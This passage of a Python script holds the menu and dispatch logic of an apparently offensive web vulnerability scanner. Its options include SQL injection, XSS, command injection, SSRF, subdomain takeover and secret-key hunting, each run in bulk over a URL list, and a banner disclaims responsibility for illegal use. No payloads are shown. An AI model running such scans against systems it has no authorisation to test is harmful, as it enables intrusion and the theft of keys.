		slowprint("\t\t\t\t\tPowered By : Trojan Kil3r Amazigh " + "\n\t\t\t\t\t\t            Contact Me : twitter.com/Kil3rdz")
	else:
		print(xx)
		slowprint("\t\t\t\t\tPowered By : Trojan Kil3r Amazigh " + "\n\t\t\t\t\t\t            Contact Me : twitter.com/Kil3rdz")

	dz = """

\t\033[1;93m---------- \033[5;92m[Bug Scanner] \033[0;93m--------\033[1;96m				|\t\033[1;93m---------- \033[5;91m[Fuzzing & Discovery] \033[0;93m--------\033[1;96m		
									| 
	\033[1;92m[01] \033[1;91m~ \033[1;96mSql Blind Time-Bassed [GET]		 		|	\033[1;92m[14] \033[1;91m~ \033[1;96mStatus Checker
	\033[1;92m[02] \033[1;91m~ \033[1;96mSql Blind Time-Bassed Via Header				|	\033[1;92m[15] \033[1;91m~ \033[1;96mPath Directory Finder
	\033[1;92m[03] \033[1;91m~ \033[1;96mCross site Scripting [XSS]				|	\033[1;92m[16] \033[1;91m~ \033[1;96mSubDomain TakeOver
	\033[1;92m[04] \033[1;91m~ \033[1;96mPHP CODE INNJECTION & OS COMAND INNJECTION  		|	\033[1;92m[17] \033[1;91m~ \033[1;96mScret Key Finder
	\033[1;92m[05] \033[1;91m~ \033[1;96mServer Side Template Injection [SSTI]			|	\033[1;92m[18] \033[1;91m~ \033[1;96mWeb Crawlers
	\033[1;92m[06] \033[1;91m~ \033[1;96mOpen Redirection 					|	\033[1;92m[19] \033[1;91m~ \033[1;96mWaybackurls With Filtres Links
	\033[1;92m[07] \033[1;91m~ \033[1;96mRFI & Local File Inclusion 				|	\033[1;92m[20] \033[1;91m~ \033[1;96mGoogle Map Api KEY Scanner
	\033[1;92m[08] \033[1;91m~ \033[1;96mHost Header Injection					|	\033[1;92m[21] \033[1;91m~ \033[1;96mHidden Parameter Discovery
	\033[1;92m[09] \033[1;91m~ \033[1;96mCross-origin resource sharing (CORS)			|
	\033[1;92m[10] \033[1;91m~ \033[1;96mServer-side request forgery (SSRF)			|\t\033[1;93m---------- \033[5;92m[Dorkers] \033[0;93m--------\033[1;96m
									|	
\t\033[1;93m---------- \033[5;94m[About Gethering] \033[0;93m--------\033[1;96m				|	\033[1;92m[22] \033[1;91m~ \033[1;96mBing Dorker | Sub Binger
									|
   	\033[1;94m[11] \033[1;95m~ \033[1;96mSubdomain Finder Online					|\t\033[1;93m---------- \033[5;95m[Help] \033[0;93m--------\033[1;96m
   	\033[1;94m[12] \033[1;95m~ \033[1;96mSubdomain Enumiration					|			
   	\033[1;94m[13] \033[1;95m~ \033[1;96mNmap Scan Ports Online					|	\033[1;96m[99] \033[1;91m~ \033[1;93mAbout\033[1;92m_Me \033[1394m#Please_Read_Me 🖕\033[0;96m
									


									"""
	print(dz)



clearscrn()
print_logo()
print("\t\033[1;96m[!] \033[1;91mNote\033[1;92m : \033[1;93mWe Don't Accept Any Responsibility For Any Iligal Usage. 😃\n")
newpath = r'db/'
if not os.path.exists(newpath):
	os.makedirs(newpath)
if not os.path.exists('output/web_Crawled'):
	os.makedirs('output/web_Crawled')
if not os.path.exists('output/Waybackurls'):
	os.makedirs('output/Waybackurls')
try:
	kabyle = int(raw_input("\033[1;94m* root@kil3r~# \033[1;92mChoose Section: "))
except:
	print("          \033[1;91;40m[-] Chose Section Number Please :(")
	sys.exit()
file = "url.txt"

def Scanner_Fastly():
    start = timer()
    pp = Pool(10)
    if kabyle == 1:
    	try:
    		print("\n \033[1;91m[!] \033[1;96mURLS List We Are Scan Now: \033[1;95murl.txt | \033[1;92mLines : " + str(len(open(file).read().splitlines())))
    		pr = pp.map(sql_check, open(file).read().splitlines())
    	except:
    		print("   \033[1;91m[-] No List Url Exist With This Name: \033[1;92;40murl.txt :(")
    elif kabyle == 2:
    	try:
    		print("\n \033[1;91m[!] \033[1;96mURLS List We Are Scan Now: \033[1;95murl.txt | \033[1;92mLines : " + str(len(open(file).read().splitlines())))
    		pr = pp.map(sql_useragent, open(file).read().splitlines())
    	except:
    		print("   \033[1;91m[-] No List Url Exist With This Name: \033[1;92;40murl.txt \033[1;91m:(")
    elif  kabyle == 3:
    	try:
    		print("\n \033[1;91m[!] \033[1;96mURLS List We Are Scan Now: \033[1;95murl.txt | \033[1;92mLines : " + str(len(open(file).read().splitlines())))
    		pr = pp.map(xsser, open(file).read().splitlines())
    	except:
    		print("   \033[1;91m[-] No List Url Exist With This Name: \033[1;92;40murl.txt \033[1;91m:(")
    elif kabyle == 4:
    	try:
    		print("\n \033[1;91m[!] \033[1;96mURLS List We Are Scan Now: \033[1;95murl.txt | \033[1;92mLines : " + str(len(open("url.txt").read().splitlines())))
    		pr = pp.map(OS_Command, open(file).read().splitlines())
    	except:
    		print("   \033[1;91m[-] No List Url Exist With This Name: \033[1;92;40murl.txt \033[1;91m:(")
    elif  kabyle == 5:
    	try:
    		print("\n \033[1;91m[!] \033[1;96mURLS List We Are Scan Now: \033[1;95murl.txt | \033[1;92mLines : " + str(len(open("url.txt").read().splitlines())))
    		pr = pp.map(ssti_check, open(file).read().splitlines())
    	except:
    		print("   \033[1;91m[-] No List Url Exist With This Name: \033[1;92;40murl.txt \033[1;91m:(")
    elif  kabyle == 6:
    	try:
    		print("\n \033[1;91m[!] \033[1;96mURLS List We Are Scan Now: \033[1;95murl.txt | \033[1;92mLines : " + str(len(open("url.txt").read().splitlines())))
    		pr = pp.map(redirection, open(file).read().splitlines())
    	except:
    		print("   \033[1;91m[-] No List Url Exist With This Name: \033[1;92;40murl.txt \033[1;91m:(")
    elif  kabyle == 7:
    	try:
    		print("\n \033[1;91m[!] \033[1;96mURLS List We Are Scan Now: \033[1;95murl.txt | \033[1;92mLines : " + str(len(open("url.txt").read().splitlines())))
    		pr = pp.map(lfinclution, open(file).read().splitlines())
    	except:
    		print("   \033[1;91m[-] No List Url Exist With This Name: \033[1;92;40murl.txt \033[1;91m:(")
    elif  kabyle == 8:
    	try:
    		print("\n \033[1;91m[!] \033[1;96mURLS List We Are Scan Now: \033[1;95murl.txt | \033[1;92mLines : " + str(len(open("url.txt").read().splitlines())))
    		pr = pp.map(X_Forwarded, open(file).read().splitlines())
    	except:
    		print("   \033[1;91m[-] No List Url Exist With This Name: \033[1;92;40murl.txt \033[1;91m:(")
    elif  kabyle == 9:
    	try:
    		print("\n \033[1;91m[!] \033[1;96mURLS List We Are Scan Now: \033[1;95murl.txt | \033[1;92mLines : " + str(len(open(file).read().splitlines())))
    		pr = pp.map(cors, open(file).read().splitlines())
    	except:
    		print("\033[1;92m[-] No List Url Exist With This Name: \033[1;92;40murl.txt :(")
    elif  kabyle == 99:
    	print("about")
    else:
    	print("          \033[1;91;40m[-] Chose Section Number Please :(")


if __name__ == '__main__':
	start = timer()
	az = Pool(10)
	speed = Pool(5)
	speed123 = Pool(7)
	if  kabyle == 12:
		try:
			print("\n \033[1;91m[!] \033[1;96mSubDomain Wordlist We Are Used PATH: \033[1;95m/db/sub_name.txt | \033[1;92mLines : " + str(len(open("db/sub_name.txt").read().splitlines())))
			Doamin = raw_input("\n\033[1;95m[?] \033[1;92mEntre Your Target : ")
			if (Doamin[:8] == "https://" or Doamin[:7] == "http://"):
				Doamin = Doamin.replace("https://", "")
				Doamin = Doamin.replace("http://", "")
			else:
				pass
			#try:
			qqh = speed.map(fuzz, open("db/sub_name.txt").read().splitlines())
		except:
			print("\033[1;91m  [!] No such file or directory: '/db/sub_name.txt'")
	elif kabyle == 16:
		print("\n \033[1;91m[!] \033[1;96mSubDomain Wordlist We Are Used PATH: \033[1;95m/db/sub_name.txt | \033[1;92mLines : " + str(len(open("db/sub_name.txt").read().splitlines())))
		Doamin = raw_input("\n\033[1;95m[?] \033[1;92mEntre Your Target : ")
		if (Doamin[:8] == "https://" or Doamin[:7] == "http://"):
			Doamin = Doamin.replace("https://", "")
			Doamin = Doamin.replace("http://", "")
		else:
			pass
			#Doamin = ("http://" + Doamin + "/")
		try:
			qqh = speed.map(ws3, open("db/sub_name.txt").read().splitlines())
		except:
			print("\033[1;91m  [!] No such file or directory: '/db/sub_name.txt'")
	elif kabyle == 15:
		print("\n \033[1;91m[!] \033[1;96mWordlist We Are Used PATH: \033[1;95m/db/wordlist.txt | \033[1;92mLines : " + str(len(open("db/wordlist.txt").read().splitlines())))
		domain = raw_input("\n\033[1;95m[?] \033[1;92mEntre Your Target Without [HTTPS://] : ")
		if (domain[:8] == "https://" or domain[:7] == "http://"):
			pass
		else:
			domain = ("http://" + domain)
		try:
			qqh = speed123.map(path, open("db/wordlist.txt").read().splitlines())
		except:
			print("\033[1;91m  [!] No such file or directory: '/db/wordlist.txt'")
			#print("\033[1;91m  [!] No File Name : db/wordlist.txt")
	elif kabyle == 17:
		filedz = raw_input("\n\033[1;95m[?] \033[1;92mEntre Your List : ")
		qqh = speed.map(key_finder, open(filedz).read().splitlines())
		#key_finder()
	elif  kabyle == 10:
		ssrf_urldz = raw_input("\t\t\033[1;95m[?] \033[1;92mEntre burp Collaborator Client URL Without [HTTP://] : ")
		
		qqh = az.map(ssrf, open(file).read().splitlines())
		#ssrf(url)
	elif kabyle == 18:
		web_crawler()
	elif kabyle == 22:
		bingerpro()
	elif kabyle == 14:
		file_check = raw_input("\t\t\033[1;95m[?] \033[1;92mEntre Your List Urls : ")
		qqh = az.map(status_checker, open(file_check).read().splitlines())
	elif kabyle == 11:
		subfinder()
	elif kabyle == 19:
		Waybackurls()
	elif kabyle == 20:
		googlemap()
	elif kabyle == 13:
		nmap()
	elif kabyle == 99:
		about()
	elif kabyle == 21:
		hidden_params()
		if len(xnober) is 0:
			print("     \033[1;40;91m[-] No Params Found :(")
		else:
			print("\n     \033[1;95m[!] " + "\033[1;95mParams Found  : " + "\033[1;91;40m[\033[1;96;40m" + str(len(xnober)) + "\033[1;40;91m]")
	else:
		Scanner_Fastly()



